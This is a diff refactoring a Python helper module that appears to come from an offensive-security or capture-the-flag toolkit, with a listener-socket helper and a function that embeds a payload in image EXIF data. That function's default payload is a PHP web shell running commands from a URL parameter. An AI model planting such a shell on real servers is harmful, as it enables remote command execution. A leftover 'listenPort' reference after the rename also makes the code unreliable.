@@ -12,12 +12,13 @@ import os
 import io
 import json
 
-from PIL import Image
-
-def isPortInUse(port):
+def is_port_in_use(port):
     import socket
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         return s.connect_ex(('127.0.0.1', port)) == 0
+
+def get_payload_path(path):
+    return os.path.realpath(os.path.join(os.path.dirname(__file__), path))
 
 def get_address(interface={"tun0", "vpn0"}):
     if not isinstance(interface, str):
@@ -111,28 +112,27 @@ def assert_json_path(res, path, value, err=None):
     err = f"[-] '{res.url}' value at path '{path}' does not match. got={json_data} expected={value}" if err is None else err
     exit_with_error(res, err)
 
-def openServer(address, ports=None):
-    listenPort = None
-    retry = True
+def open_server(address, ports=None, retry=True):
+    listen_port = None
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     while retry:
 
         if isinstance(ports, int):
-            listenPort = ports
+            listen_port = ports
             retry = False
         elif isinstance(ports, range):
-            listenPort = random.randint(ports[0],ports[-1])
+            listen_port = random.randint(ports[0], ports[-1])
         elif ports is None:
-            listenPort = random.randint(10000,65535)
+            listen_port = random.randint(10000,65535)
 
         try:
-            sock.bind((address, listenPort))
+            sock.bind((address, listen_port))
             sock.listen(1)
             return sock
         except Exception as e:
             if not retry:
-                print("Unable to listen on port %d: %s" % (listenPort, str(e)))
+                print("[-] Unable to listen on port %d: %s" % (listenPort, str(e)))
             raise e
 
 class Stack:
@@ -222,6 +222,7 @@ def base64urldecode(data):
 
 def set_exif_data(payload="<?php system($_GET['c']);?>", _in=None, _out=None, exif_tag=None, _format=None):
     import exif
+    from PIL import Image
 
     if _in is None or (isinstance(_in, str) and not os.path.exists(_in)):
         _in = Image.new("RGB", (50,50), (255,255,255))
